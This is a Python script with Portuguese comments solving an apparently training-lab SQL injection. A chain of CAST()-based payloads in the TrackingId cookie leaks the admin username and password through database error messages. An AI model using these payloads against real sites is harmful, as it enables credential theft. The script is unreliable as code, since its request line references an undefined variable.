import requests

# Parâmetro vulnerável: Cookies -> TrackingId

# PAYLOADS
sqli_1 = "'--" # 200 OK
sqli_2 = "'" # 500 Internal Server Error
"""
Aplicação retorna mensagem de erro detalhada com a consulta executada: 
SELECT * FROM tracking WHERE id = 'abcdwxyz...''
Como a aplicação retorna mensagens de erro detalhadas, incluindo a consulta executada, 
a utilização da função CAST() (conversão de tipos de dados) pode ser útil nessa exploração, 
pois ao forçar a conversão de um valor incompatível com o tipo esperado,
seja de uma coluna específica ou do resultado de uma consulta, o BD tende a gerar erros descritivos.
"""
sqli_3 = "' AND CAST((SELECT 1) AS int)--"
# Incluindo um AND e SELECT e convertendo o valor para inteiro a aplicação retorna o erro:
# ERROR: argument of AND must be type boolean, not type integer
sqli_4 = "' AND 1=CAST((SELECT 1) AS int)--"
# Inserindo uma condição booleana a aplicação não retorna mais erro
sqli_5 = "' AND 1=CAST((SELECT username FROM users) AS int)--"
# Alterando o SELECT para selecionar um usuário na tabela users a aplicação retorna um erro devido a um limite de caracteres
# Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'G3omS2IXBvgukHSg' AND 1=CAST((SELECT username FROM user) AS '. Expected  char
sqli_6 = "' AND 1=CAST((SELECT username FROM users) AS int)--"
# Após resolver o problemas do limite de caracteres apagando parte do TrackingID...
# Alterando o SELECT para selecionar um usuário na tabela users a aplicação retorna um novo erro pois a consulta retornou mais de uma linha:
# ERROR: more than one row returned by a subquery used as an expression
sqli_7 = "' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--"
# Limitando a consulta a apenas uma linha a aplicação retorna um erro revelando o primeiro nome de usuário da tabela users
# ERROR: invalid input syntax for type integer: "administrator"
sqli_8 = "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"
# Alterando o SELECT para selecionar a password do primeiro usuário (administrator) na tabela users a aplicação 
# retorna um erro revelando a password do administrator 
# ERROR: invalid input syntax for type integer: "h2f88ej0zexlgap86351"

url = 'https://0af90057037035e181034dcf009c00b5.web-security-academy.net/'
# Para as requests de sqli_1 até sqli_5
cookies = {
    'TrackingId': '' + sqli,
}
response = requests.get(url, cookies=cookies)

print(response.text)